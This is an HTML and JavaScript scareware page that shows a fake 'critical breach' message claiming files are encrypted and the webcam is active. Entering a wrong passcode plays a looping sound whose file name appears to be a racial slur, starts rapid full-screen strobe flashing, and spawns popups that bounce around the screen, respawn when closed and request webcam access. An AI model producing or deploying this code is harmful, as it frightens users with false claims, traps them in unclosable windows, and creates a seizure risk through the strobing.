<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SYSTEM_STABLE_BOUNCE</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
        @keyframes strobe { 0% { background-color: #000; } 33% { background-color: #f00; } 66% { background-color: #fff; } 100% { background-color: #000; } }
        .flash-active { animation: strobe 0.1s infinite; }
        #box { border: 5px solid #f00; padding: 30px; background: #000; box-shadow: 0 0 50px #f00; z-index: 100; width: 400px; color: #f00; }
        h1 { font-weight: bold; margin: 0 0 10px 0; font-size: 2.5rem; }
        input { background: #000; color: #f00; border: 2px solid #f00; padding: 10px; text-align: center; font-size: 1.2rem; margin: 15px 0; outline: none; width: 80%; }
        button { background: #f00; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.5rem; }
    </style>
</head>
<body id="mainBody">

<div id="box">
    <h1>⚠️ CRITICAL BREACH ⚠️</h1>
    <p>FILES ENCRYPTED. WEBCAM ACTIVE.</p>
    <input type="text" id="passcode" maxlength="4" placeholder="----">
    <br>
    <button onclick="check()">STOP DELETION</button>
</div>

<script>
    const sound = new Audio("https://www.myinstants.com/media/sounds/nggr.mp3");
    sound.loop = true;

    let cameraWins = [];
    let normalWins = [];

    function check() {
        if (document.getElementById('passcode').value === "6767") {
            alert("BYPASS GRANTED.");
            location.reload();
        } else {
            startChaos();
        }
    }

    function startChaos() {
        sound.play();
        document.getElementById('mainBody').classList.add('flash-active');
        smartSpawn();
        setInterval(smartSpawn, 3000);
    }

    function smartSpawn() {
        cameraWins = cameraWins.filter(w => !w.closed);
        normalWins = normalWins.filter(w => !w.closed);
        if (cameraWins.length < 5) spawn(true);
        else if (normalWins.length < 10) spawn(false);
    }

    function spawn(isCamera) {
        const w = 350, h = 300;
        // Start near center to avoid initial corner traps
        let curX = Math.floor(Math.random() * (screen.availWidth - w));
        let curY = Math.floor(Math.random() * (screen.availHeight - h));

        const win = window.open("", "", `width=${w},height=${h},left=${curX},top=${curY}`);

        if (win) {
            win.document.write(`
                <html>
                <head>
                    <style>
                        @keyframes strobe { 0% { background:#000; } 50% { background:#f00; } 100% { background:#fff; } }
                        body { animation: strobe 0.08s infinite; color:white; font-family:sans-serif; text-align:center; overflow:hidden; margin:0; border:10px solid black; }
                    </style>
                </head>
                <body>
                    ${isCamera ? '<video id="v" autoplay style="width:100%; height:180px; object-fit:cover;"></video>' : '<h1 style="font-size:100px;">💀</h1>'}
                    <h1>GET HACKED!!</h1>
                    <script>
                        ${isCamera ? 'navigator.mediaDevices.getUserMedia({ video: true }).then(s => { document.getElementById("v").srcObject = s; });' : ''}
                        
                        // New absolute movement engine
                        let x = ${curX}, y = ${curY};
                        let dx = ${Math.random() > 0.5 ? 15 : -15}; 
                        let dy = ${Math.random() > 0.5 ? 15 : -15};
                        const width = 350, height = 300;

                        function bounce() {
                            x += dx;
                            y += dy;

                            // Collision detection with absolute screen bounds
                            if (x + width >= screen.availWidth || x <= 0) {
                                dx = -dx;
                                // Force away from edge to prevent sticking
                                x = (x <= 0) ? 5 : screen.availWidth - width - 5;
                            }
                            if (y + height >= screen.availHeight || y <= 0) {
                                dy = -dy;
                                // Force away from edge to prevent sticking
                                y = (y <= 0) ? 5 : screen.availHeight - height - 5;
                            }

                            window.moveTo(x, y);
                        }
                        
                        // Start moving after 10 seconds
                        setTimeout(() => {
                            // kick once then run repeatedly for smooth motion
                            bounce();
                            setInterval(bounce, 10);
                        }, 10000);
                    <\/script>
                </body>
                </html>
            `);

            if (isCamera) cameraWins.push(win);
            else normalWins.push(win);

            const checkClosed = setInterval(() => {
                if (win.closed) {
                    clearInterval(checkClosed);
                    setTimeout(smartSpawn, 100);
                    setTimeout(smartSpawn, 200);
                }
            }, 500);
        }
    }
</script>
